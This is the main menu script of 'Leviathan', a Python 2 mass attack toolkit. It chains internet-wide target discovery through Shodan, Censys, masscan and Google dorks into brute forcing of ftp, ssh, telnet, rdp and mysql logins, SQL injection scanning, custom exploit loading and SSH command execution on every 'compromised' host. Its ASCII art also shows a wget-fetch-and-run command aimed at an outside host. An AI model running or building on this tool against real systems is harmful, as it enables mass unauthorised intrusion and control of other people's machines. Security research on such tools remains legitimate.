#!/usr/bin/env python
# -*- coding: utf-8 -*-
# title           :leviathan.py
# description     :Leviathan, wide range mass audit toolkit.
# author          :Ozge Barbaros, Utku Sen
# date            :May 2017
# version         :0.1.2
# usage           :python leviathan.py
# notes           :
# python_version  :2.7.6
# =======================================================================

# Import the modules needed to run the script.
import os
import sys
import time
import importlib
import glob

from lib.protocol_scanner import shodan_search, censys_search, mass_scan
from lib.utils import query_constructor, automatic_dork, show_config_file, \
    config_change, get_file_by_dicovery_id, return_asset
from lib.brute_forcer import brute_force, bruteforce_all, brute_force_specific
from lib.sqli_scanner import sqli_scan, sqli_scan_all, link_extract
from lib.send_command import send_command_ssh, send_to_all_ssh
from leviathan_config import COUNTRY_CODES, BASE_DIR


# Main definition - constants
menu_actions = {}
shodan_actions = {}
censys_actions = {}
webscan_actions = {}
shodan_protocols = {
    'ssh': 'ssh',
    'ftp': 'ftp',
    'telnet': 'telnet',
    'smb': 'smb',
    'rdp': 'rdp',
    'mysql': 'mysql',
}
censys_protocols = {
    'ftp': 'ftp',
    'ssh': 'ssh',
    'telnet': 'telnet',
}
show_assets_protocols = {
    '1': 'ftp',
    '2': 'ssh',
    '3': 'telnet',
    '4': 'rdp',
    '5': 'mysql',
    '6': 'web',
    '7': 'all'
}
bruteforce_all_protocols = {
    '1': 'ftp',
    '2': 'ssh',
    '3': 'telnet',
    '4': 'rdp',
    '5': 'mysql'
}

menu4_keys = {
    '1': 'GOOGLE_API_KEY',
    '2': 'GOOGLE_CSE_ID',
    '3': 'CENSYS_UID',
    '4': 'CENSYS_SECRET',
    '5': 'SHODAN_API_KEY',
}

menu2_actions = {}
attack_actions = {}


# =======================
#     MENUS FUNCTIONS
# =======================

# Main menu
def main_menu():
    print """

Select from the menu:

1)Discovery
2)Attack
3)Assets
4)Configuration
9)Back
0)Exit


    """
    choice = raw_input(">>")
    exec_menu(choice, menu_actions)

    return



def menu1():
    print """

 _______________          |*\_/*|________ 
|  ___________  |        ||_/-\_|______  | 
| |           | |        | |           | | 
| |   0   0   | |        | |   0   0   | | 
| |     -     | |        | |     -     | | 
| |   \___/   | |        | |   \___/   | | 
| |___     ___| |        | |___________| | 
|_____|\_/|_____|        |_______________| 
 _|__|/ \|_|_.............._|________|_
/ ********** \            / ********** \ 
/ ************ \         / ************ \   
     _ _                                   
    | (_)                                  
  __| |_ ___  ___ _____   _____ _ __ _   _ 
 / _` | / __|/ __/ _ \ \ / / _ \ '__| | | |
| (_| | \__ \ (_| (_) \ V /  __/ |  | |_| |
 \__,_|_|___/\___\___/ \_/ \___|_|   \__, |
                                      __/ |
                                     |___/ 
                                 
Discovery module helps you to identify machines which runs a specific service. 
You can extract pre-discovered machines with Shodan's or Censys's API (option 1-2) 
or you can scan them yourself with masscan tool.(option 3)

Also you can discover websites according to a dork from Google. (option 4)

    1. Shodan
    2. Censys
    3. Masscan
    4. Web Scanner

    9. Back
    0. Quit
    """
    choice = raw_input(" >>  ")
    exec_menu(choice, menu1_actions)
    return


def shodan():
    print """

           +.       _____  .        .        + .                    .
   .        .   ,-~"     "~-.                                +
              ,^ ___         ^. +                  .    .       .
             / .^   ^.         \         .      _ .
            Y  l  o  !          Y  .         __  \|--.
    .       l_ `.___.'        _,[           L__/_\|' //--_-          +
            |^~"-----------""~ ^|       +    __L_(|): ]-----
  +       . !                   !     .     T__\ /|. //---- -       .
         .   \    Shodan.io    /               ~^-|--'
              ^.             .^            .      |       +.
                "-.._____.,-" .                    .
         +           .                .   +                       


    Shodan module will you to extract pre-discovered machines via Shodan's API. 

    In 'Automatic Query' section you can generate Shodan search query and find machines 
    by providing country code and service type.

    In 'Custom Query' section you need to enter your Shodan search query by yourself.

    1. Automatic Query
    2. Custom Query

    9. Back
    0. Quit
    """
    choice = raw_input(">>")
    exec_menu(choice, shodan_actions)
    return


def shodan_auto_query():
    print """
    Enter Country Code:

    (Examples:TR,RU,USA,IT)
    """

    country_code = raw_input(">>")
    try:
        COUNTRY_CODES[country_code.upper()]
    except KeyError:
        print "Invalid selection, please try again.\n"
        shodan()

    print """
    Enter Protocol 

    (Examples:ssh, ftp, telnet, smb, rdp, mysql):
    """
    protocol = raw_input(">>")
    try:
        shodan_protocols[protocol]
    except KeyError:
        print "Invalid selection, please try again.\n"
        shodan()
    query = query_constructor(country_code, protocol, 'shodan')
    res = shodan_search(query, protocol)
    if res:
        time.sleep(2)
        main_menu()
    else:
        shodan()


def shodan_custom_query():
    print """
    Enter your query:

    (Example: apache city:"Istanbul")
    """
    query = raw_input(">>")
    protocol = "custom"
    res = shodan_search(query, protocol)
    if res:
        time.sleep(2)
        main_menu()
    else:
        shodan()



def censys():
    print """

               +.   _____  .        .        + .                    .
   .        .   ,-~"     "~-.                                +
              ,^ ___         ^. +                  .    .       .
             / .^   ^.         \         .      _ .
            Y  l  o  !          Y  .         __  \Z--.
    .       l_ `.___.'        _,[           L__/_\M' //--_-          +
            |^~"-----------""~ ^|       +    __L_(A): ]--ZGRAB--
  +       . !                   !     .     T__\ /P. //---- -       .
         .   \    Censys.io    /               ~^-|--'
              ^.             .^            .      |       +.
                "-.._____.,-" .                    .
         +           .                .   +              


    Censys module will you to extract pre-discovered machines via Censys's API. 

    In 'Automatic Query' section you can generate Censys search query and find machines 
    by providing country code and service type.

    In 'Custom Query' section you need to enter your Censys search query by yourself.

    1. Automatic Query
    2. Custom Query

    9. Back
    0. Quit
    """
    choice = raw_input(">>")
    exec_menu(choice, censys_actions)
    return


#TODO: basarili bir sekilde kaydetmesine ragmen invalid selection'a dusuyor
def censys_auto_query():
    print """
        Enter Country Code:

        (Examples:TR,RU,USA,IT)
        """

    country_code = raw_input(">>")
    try:
        COUNTRY_CODES[country_code.upper()]
    except KeyError:
        print "Invalid selection, please try again.\n"
        censys_auto_query()

    print """
        Enter Protocol 

        (Examples:ssh, ftp, telnet):
        """
    protocol = raw_input(">>")
    try:
        censys_protocols[protocol]
    except KeyError:
        print "Invalid selection, please try again.\n"
        censys()
    query = query_constructor(country_code, protocol, 'censys')
    res = censys_search(query, protocol)
    if res:
        time.sleep(5)
        main_menu()
    else:
        censys()


#TODO: basarili bir sekilde kaydetmesine ragmen invalid selection'a dusuyor
def censys_custom_query():
    print """
    Enter your query:

    (Example: location.country_code: US and tags: scada)
    """
    query = raw_input(">>")
    protocol = "custom"
    res = censys_search(query, protocol)
    if res:
        time.sleep(5)
        main_menu()
    else:
        censys()


def masscan():
    print """

          ,;;;,
         ;;;;;;; --> Robert David Graham
      .-'`\, '/_
    .'   \ ("`(_)
   / `-,.'\ \_/
   \  \/\  `--`
    \  \ \
     / /| |
    /_/ |_|
   ( _\ ( _\  #:##        #:##        #:##         #:##
                    #:##        #:##        #:##

    Enter IP range:

    (Examples:83.49.0.0/16, 0.0.0.0/0)
    """
    ip_range = raw_input(">>")
    print """
    Enter Protocol 

    (Examples:ssh, ftp, telnet, smb, rdp, mysql):
    """
    protocol = raw_input(">>")
    res = mass_scan(ip_range, protocol)
    if res:
        time.sleep(5)
        main_menu()
    else:
        masscan()


def webscan():
    print """

                                 \_______/
                             `.,-'\_____/`-.,'      
                              /`..'\ _ /`.,'\     
                             /  /`.,' `.,'\  \     
                      WEB   /__/__/     \__\__\__  SCANNER 
                            \  \  \     /  /  /
                             \  \,'`._,'`./  /   
                              \,'`./___\,'`./
                             ,'`-./_____\,-'`.
                                 /       \


    Web Scanner module allows you to extract URLs from Google with given dork.

    In 'Automatic Dork' section, you can create a dork by providing country code
    and domain extension.

    Also you can provide your own dork in 'Custom Dork' section.

    1. Automatic Dork
    2. Custom Dork

    9. Back
    0. Quit
    """
    choice = raw_input(">>")
    exec_menu(choice, webscan_actions)
    return


def webscan_auto_dork():
    print """

    Enter Country Code:

    (Examples:tr,usa,ru,ca)

    """

    country_code = raw_input(">>")
    try:
        COUNTRY_CODES[country_code.upper()]
    except KeyError:
        print "Invalid selection, please try again.\n"
        webscan_auto_dork()

    print """

    Enter domain extension:

    (Example:gov,edu,org)

    """
    extension = raw_input(">>")
    try:
        pass
    except KeyError:
        print "Invalid selection, please try again.\n"
        webscan_auto_dork()

    print """
        Number of URLs to extract:
        """
    number = int(raw_input(">>"))

    query = automatic_dork(country_code, extension)
    res = link_extract(query, number)
    res = 1
    if res:
        time.sleep(5)
        main_menu()
    else:
        webscan_auto_dork()


def webscan_custom_dork():
    print """
        Enter your dork:

        (Example: inurl:.php?id=)
        """
    query = raw_input(">>")
    print """
        Number of URLs to extract:
        """
    number = int(raw_input(">>"))
    res = link_extract(query, number)
    res = 1
    if res:
        time.sleep(5)
        main_menu()
    else:
        webscan_custom_dork()



def menu2():
    print """
                                                             c=====e
                                                                H
       ____________                                         _,,_H____
      (__((__((___()                                       //|       |
     (__((__((___()()_____________________________________// |ATTACK |
    (__((__((___()()()------------------------------------'  |_______|

    In Attack module there are four options listed for your usage.
    Following attacks will be done to the targets which are discovered
    in 'Discovery' section.

    In 'Brute Force' section you can make brute force attacks for following
    protocols: ftp, ssh, telnet, rdp, mysql

    In 'Web(SQL Injection)' section you can search for SQL Injection
    vulnerabilities on pre-discovered URLs

    In 'Custom Exploit' section you can run a custom exploit for 
    pre-discovered targets.

    In 'Run remote command' section you can execute commands remotely
    on compromised machines.

    1)Brute Force
    2)Web(SQL Injection)
    3)Custom Exploit
    4)Run remote command

    9. Back
    0. Quit
    """
    choice = raw_input(" >>  ")
    exec_menu(choice, menu2_actions)
    return


def bruteforce():
    print """
                    ,N.
                  _/__ \   "If you eliminate all other possibilities
                   -/o\_\  the one that remains, however unlikely,
                 __\_-./   is the right answer." - Sherlock Holmes
                / / V \`U-.
    ())        /, > o <    \  
    <\.,.-._.-" [-\ o /__..-'  
    |/_  ) ) _.-"| \o/  |  \ o!0
       `'-'-" 


    In this section you can make brute force attacks for following
    protocols: ftp, ssh, telnet, rdp, mysql

    You can specifiy your targets by providing discovery id (option 1)

    You can brute force all discovered targets by providing a protocol (option 2)

    Or you can enter an IP address, Port, and Protocol to brute force (option 3)

    1)Attack by Discovery id
    2)Attack all discovered machines by Protocol
    3)Attack specific IP, Port, and Protocol

    9. Back
    0. Quit

    """
    attack_type = raw_input(">>")
    exec_menu(attack_type, attack_actions)
    return


def bruteforce_specific():
    print """
    IP Address:
    """
    ip_address = raw_input(">>")

    print """
    Port Number:
    """
    port = raw_input(">>")

    print """
    Select Protocol:

    1. ftp
    2. ssh
    3. telnet
    4. rdp
    5. mysql

    9. back
    0. exit

    """
    index = raw_input(">>")
    try:
        protocol = bruteforce_all_protocols[index]
        res = brute_force_specific(ip_address, port, protocol)
        if res:
            time.sleep(5)
            main_menu()
        else:
            bruteforce()
    except KeyError:
        exec_menu(index, menu4_actions)


def bruteforce_by_discovery_id():
    print """
    Discovery ID:
    """
    discovery_id = raw_input(">>")
    res = brute_force(discovery_id)
    if res:
        time.sleep(5)
        main_menu()
    else:
        bruteforce()


def bruteforce_all_menu():
    print """
    Select Protocol:

    1. ftp
    2. ssh
    3. telnet
    4. rdp
    5. mysql

    9. back
    0. exit

    """
    index = raw_input(">>")
    try:
        selected = bruteforce_all_protocols[index]
        res = bruteforce_all(selected)
        if res:
            time.sleep(5)
            main_menu()
        else:
            bruteforce()
    except KeyError:
        exec_menu(index, menu4_actions)


def sqli_menu():
    print """
                  Anatomy of Miroslav Stampar

             ___           _,.---,---.,_
            |         ,;~'             '~;,  --- In-band
            |       ,;                     ;,      
   First    |      ;                         ; ,--- Error Based
   Order    |     ,'                         /'
            |    ,;                        /' ;, --- Out-of-band
            |    ; ;      .           . <-'  ; |
            |__  | ;   ______       ______   ;<----- Time Based Blind
           ___   |  '/~"     ~" . "~     "~'  |
           |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 Second    |      |   |        }:{        | <------ Boolean Based Blind
  Order    |      |   l       / | \       !   |
           |      .~  (__,.--" .^. "--.,__)  ~. 
           |      |    ----;' / | \ `;-<--------- Union Based
           |__     \__.       \/^\/       .__/  


        In this section you can search for SQL Injection
        vulnerabilities on pre-discovered URLs

        You can specifiy your targets by providing discovery id (option 1)

        Or you can search SQL Injection on all discovered targets.

        1)Attack by Discovery id
        2)Attack all discovered machines

        9. Back
        0. Quit

        """
    attack_type = raw_input(">>")
    exec_menu(attack_type, slqi_attack_actions)
    return



def sqli_by_discovery_id():
    print """
        Discovery ID:
        """
    discovery_id = raw_input(">>")
    res = sqli_scan(discovery_id)
    if res:
        time.sleep(5)
        main_menu()
    else:
        sqli_menu()



def sqli_attack_all():
    print """
        Attack starting..:

        """
    res = sqli_scan_all()
    if res:
        time.sleep(5)
        main_menu()
    else:
        sqli_menu()


def custom_exploit():
    print """
                                                        .:^
                                 ^                     /   :
                    '`.        /;/                    /    /
                    \  \      /;/                    /    /
                     \  \    /;/                    /  ///
                      \  \  /;/                    /  ///
                       \  \/_/____________________/    /
                        `/                         \  /
                        { (+) <Custom Exploits> (+) }'
                         \_________________________/
    
    In "Custom Exploit" section, you can exploit pre-discovered targets.
    Firstly, you need to specifiy your targets by providing a discovery id.
    After then, you need to choose an exploit. Available exploits will be listed

    """
    print """
        Discovery ID:
        """
    discovery_id = raw_input(">>")
    print "Existing exploits:\n"
    files = glob.glob(BASE_DIR+"/lib/exploits/*.py")
    for file in files:
        f = file.split("/")[-1].split(".")[0]
        if f != "__init__":
            show_desc = getattr(importlib.import_module("lib.exploits.%s" % f) , "show_desc")
            print f, ":", show_desc()
    print """
        Exploit name:
        (Example:shellshock)
        """
    exploit_name= raw_input(">>")
    try:
        action = getattr(importlib.import_module("lib.exploits.%s" % exploit_name) , "action")
        action(discovery_id)
    except ImportError as e:
        print "Invalid Exploit name"

    time.sleep(10)
    main_menu()


def run_command():
    print """

                ,----------------,                ,---------, 
            ,--------------------------,        ,"        ," |
          ,"                       ,"  |       ,"        ,"  |
         +------------------------+ |  |     ,"        ,"    |
         |  .--------------------.  |  |     +---------+     |
         |  |                    |  |  |     | -==----'|     |
         |  |$>wget pwn.ru/dos.pl|  |  |     |         |     |
         |  | chmod +x dos.pl    |  |  |/----|`---=    |     |
         |  |./dos.pl utkusen.com|  |  |     |==== ooo |      ;
         |  |                    |  |  |     |(((( [33]|    ,"
         |  `--------------------'  |,"      | |((((   |  ,"
         +-----------------------+  ;;       | |       |,"     
            /_)______________(_/  //'       +.---------+
       ___________________________/___  
      /  oooooooooooooooo  .o.  oooo /,   
     / ==ooooooooooooooo==.o.  ooo= //   
    /_==__==========__==_ooo__ooo=_/'   
    `-----------------------------'

    In 'Run remote command' section you can execute commands remotely
    on compromised machines. Only Unix bash commands are supported.

    1)Run Command by Discovery id
    2)Run Command on all compromised machines

    9. Back
    0. Quit

    """
    selected = raw_input(">>")
    exec_menu(selected, run_command_actions)


def run_by_discovery_id():
    print """
    >> Discovery ID:
    """
    discovery_id = raw_input(">>")
    print """
    >> Enter your command:
    """
    command = raw_input(">>")
    send_command_ssh(discovery_id, command)
    time.sleep(2)
    main_menu()


def run_for_all():
    print """
    >> Enter your command:
    """
    command = raw_input(">>")
    send_to_all_ssh(command)
    time.sleep(2)
    main_menu()



def menu3():
    print """
            _.------.                        .----.__
           /         |_.       ._           /---.__  |
          |  O    O   |||___  //|          /       `| |
          |  .vvvvv.  | )   `(/ |         | o     o  ||
          /  |     |  |/      | |  /|   ./| .vvvvv.  ||
         /   `^^^^^'  / _   _  `|_ ||  / /| |     |  | |
       ./  /|         | O)  O   ) ||| //' | `^vvvv'  |/||
      /   / |         |        /  | | ~   |          |  ||
      |  /  |        / | Y   /'   | |     |          |   ~
       `'   |  _     |  `._/' |   |  |     7        /
         _.-'-' `-'-'|  |`-._/   /    | _ /    .    |
    __.-'            |  |   .   / |_.  | -|_/|/ `--.|_
 --'                  |  | |   /    |  |              `-
                       |uU |UU/     |  /   
                                    _       
                                   | |      
                  __ _ ___ ___  ___| |_ ___ 
                 / _` / __/ __|/ _ | __/ __|
                | (_| |__ |__ |  __/ |_|__ |
                 |__,_|___/___/|___||__|___/

    In this section you can see discovered or compromised devices.

    1. Show discovered machines
    2. Show compromised machines

    9. Back
    0. Quit
    """
    choice = raw_input(" >>  ")
    exec_menu(choice, menu3_actions)
    return


def show_discovered():
    print """
    Select Protocol:

    1. ftp
    2. ssh
    3. telnet
    4. rdp
    5. mysql
    6. web
    7. everything

    9. back
    0. exit

    """
    selected = raw_input(">>")
    try:
        protocol = show_assets_protocols[selected]
        return_asset(protocol, "discovered")
        show_preview_menu("discovered")

    except KeyError:
        exec_menu(selected, assets_actions)


def show_preview_menu(type):
    print """
    Select From Menu:

    1. Show Preview by ID

    9. back
    0. exit

    """
    selected = raw_input(">>")
    if selected == '1':
        print "Enter discovery id:"
        discovery_id = raw_input(">>")
        try:
            file = get_file_by_dicovery_id(discovery_id, type)
            if file:
                with open(file, "r") as content:
                    content_split = content.read().splitlines()
                    for count, line in enumerate(content_split):
                        print line
                        if count > 5:
                            break
        except IOError:
            print "There is no such dicovery id."
        main_menu()
    else:
        exec_menu(selected, assets_actions)


def show_compromised():
    print """
    Select Protocol:

    1. ftp
    2. ssh
    3. telnet
    4. rdp
    5. mysql
    6. web
    7. everything

    9. back
    0. exit

    """
    selected = raw_input(">>")

    try:
        protocol = show_assets_protocols[selected]
        return_asset(protocol, "compromised")
        show_preview_menu("compromised")
    except KeyError:
        exec_menu(selected, assets_actions)



def menu4():
    print """


                                                 .------.------.    
  +-------------+                     ___        |      |      |    
  |             |                     \ /]       |      |      |    
  | Config Room |        _           _(_)        |      |      |    
  |             |     ___))         [  | \___    |      |      |    
  |             |     ) //o          | |     \   |      |      |    
  |             |  _ (_    >         | |      ]  |      |      |    
  |          __ | (O)  \__<          | | ____/   '------'------'    
  |         /  o| [/] /   \)        [__|/_                          
  |             | [\]|  ( \         __/___\_____                    
  |             | [/]|   \ \__  ___|            |                   
  |             | [\]|    \___E/  /|____________|_____              
  |             | [/]|=====__   (_____________________)             
  |             | [\] \_____ \    |                  |              
  |             | [/========\ |   |                  |              
  |             | [\]     []| |   |                  |              
  |             | [/]     []| |_  |                  |              
  |             | [\]     []|___) |                  |             
====================================================================

    In this section you can change your API keys for Google, Shodan or Censys.

    1. Google API Key
    2. Google CSE ID
    3. Censys UID
    4. Censys Secret
    5. Shodan API Key
    6. Show Config File
    
    9. Back
    0. Quit
    """
    choice = raw_input(" >>  ")
    try:
        parameter = menu4_keys[choice]
        print ">> Enter your key:"
        key = raw_input(">> ")
        config_change(parameter, key)
    except KeyError:
        exec_menu(choice, menu4_actions)
    print """
    Select From Menu:

    9. back
    0. exit

    """
    selected = raw_input(">>")
    if selected == '9':
        menu4()
    else:
        exit()    
    return


# Back to main menu
def back():
    menu_actions['main_menu']()


# Exit program
def exit():
    sys.exit()


# Execute Menu
def exec_menu(choice, menu_actions, parameter=None):
    os.system('clear')
    ch = choice.lower()
    if ch == '':
        if parameter:
            menu_actions['main_menu'](parameter)
        else:
            menu_actions['main_menu']()
    else:
        try:
            menu_actions[ch]()
        except KeyError:
            print "Invalid selection, please try again.\n"
            menu_actions['main_menu']()
    return


# =======================
#    MENUS DEFINITIONS
# =======================

# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '3': menu3,
    '4': menu4,
    '9': back,
    '0': exit,
}

menu1_actions = {
    '1': shodan,
    '2': censys,
    '3': masscan,
    '4': webscan,
    '9': back,
    '0': exit,
}

shodan_actions = {
    '1': shodan_auto_query,
    '2': shodan_custom_query,
    '9': back,
    '0': exit,
}

censys_actions = {
    '1': censys_auto_query,
    '2': censys_custom_query,
    '9': back,
    '0': exit,
}

webscan_actions = {
    '1': webscan_auto_dork,
    '2': webscan_custom_dork,
    '9': back,
    '0': exit,
}

menu2_actions = {
    '1': bruteforce,
    '2': sqli_menu,
    '3': custom_exploit,
    '4': run_command,
    '9': back,
    '0': exit,
}

# bruteforce_actions = {
#    '1': bruteforce_ftp,
#    '2': bruteforce_ssh,
#    '3': bruteforce_telnet,
#    '4': bruteforce_rdp,
#    '5': bruteforce_mysql,
# }

attack_actions = {
    '1': bruteforce_by_discovery_id,
    '2': bruteforce_all_menu,
    '3': bruteforce_specific,

    '9': back,
    '0': exit,
}

slqi_attack_actions = {
    '1': sqli_by_discovery_id,
    '2': sqli_attack_all,

    '9': back,
    '0': exit,
}

menu3_actions = {
    '1': show_discovered,
    '2': show_compromised,

    '9': back,
    '0': exit,
}

assets_actions = {
    '9': back,
    '0': exit
}

menu4_actions = {

    '6': show_config_file,

    '9': back,
    '0': exit,
}

run_command_actions = {
    '1': run_by_discovery_id,
    '2': run_for_all,

    '9': back,
    '0': exit
}
# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    os.system('clear')
    import sys
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=37, cols=92))
    print """
 ▓▓▀▀▓█▀ ▌█▓▓▓▓▓
 ██         ▓▓▓▓    ▓                  █          ▓    ▌
            ▓▓▓▌    ▓  ██▀▀▓█ ▓     ██ ▓  ██▀▀█▓ ▓▓█▓─ ▓█▀▀██  ╓██▀██▄ ███▀▀▓▓
      ▐▌ ▓▓▌ ▓▓     ▓ █▌    █▄ ▓   ╒▌  ▓       ▓  █    ▌    ▐▓ ╙     ▌ █▄    ▓
       ▀▓▓▓▓▓▓─     ▓ █▓▀▀▀▀▀   ▓  ▓   ▓ ╒█▌▀▀▀▓  █    ▌    ▐▓ ▓█▀▀▀█▌ █▄    ▓
       ▓▓▓▓▓▀       ▓ ▀▓    ▓    ▌▓    ▓ ▀▓    ▓  █    ▌    ▐▓ ▓    ▓▌ █▄    ▓
      ▀▓▓▓▓▀        ▀   ▀▌▌▀     └     ▀   ▀▌▀─╙   ▀▌           ╙▀▌▀ └
        █─

[---]       Leviathan, wide range mass audit toolkit. | version: 0.1.2      [---]
[---]                                                                       [---]
[---]               Created by Ozge Barbaros & Utku Sen                     [---]
[---] ozgebarbaros.com | twitter.com/ozgebarbaros | github.com/ozgebarbaros [---]
[---]      utkusen.com | twitter.com/utku1337 | github.com/utkusen          [---]
[---]                                                                       [---]
[---]                      May 2017, Istanbul                               [---]


LEGAL WARNING: While this may be helpful for some, there are significant risks.
You could go to jail on obstruction of justice charges just for running leviathan,
even though you are innocent. You are on notice, that using this tool outside your
"own" environment is considered malicious and is against the law. Use with caution.
    """
    try:
        main_menu()
    except KeyboardInterrupt:
        print "Killed!"
        sys.exit()
